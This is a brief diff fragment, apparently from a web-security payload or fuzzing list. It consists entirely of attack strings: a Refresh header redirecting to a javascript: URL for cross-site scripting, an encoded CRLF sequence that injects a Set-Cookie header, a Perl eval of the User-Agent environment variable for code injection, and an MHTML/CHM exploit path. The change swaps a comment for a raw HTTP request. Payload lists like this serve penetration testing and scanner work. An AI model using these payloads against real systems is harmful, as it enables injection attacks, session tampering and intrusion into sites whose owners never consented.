@@ -30,4 +30,4 @@ Refresh: 0; URL=http://example.com;URL=javascript:alert(1)
 %E5%98%8A%E5%98%8DSet-Cookie:%20test
 POSIX;eval($ENV{HTTP_USER_AGENT});exit;
 &amp;#109;s-its:mhtml:file://C:\foo.mht!${PATH}/EXPLOIT.CHM::/exploit.htm
-/* RFI STOP */
+GET / HTTP/1.1\nHost:localhost\n\n
